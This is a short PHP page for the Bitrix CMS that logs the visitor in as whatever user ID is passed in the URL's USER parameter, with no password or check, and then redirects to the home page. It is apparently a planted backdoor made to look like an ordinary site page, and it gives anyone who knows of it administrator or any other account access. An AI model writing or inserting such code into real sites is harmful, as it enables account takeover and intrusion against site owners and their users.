<?
require($_SERVER["DOCUMENT_ROOT"]."/bitrix/header.php");
global $USER;
$USER->Authorize($_GET["USER"]); 
LocalRedirect("/");
?>
<?require($_SERVER["DOCUMENT_ROOT"]."/bitrix/footer.php");?>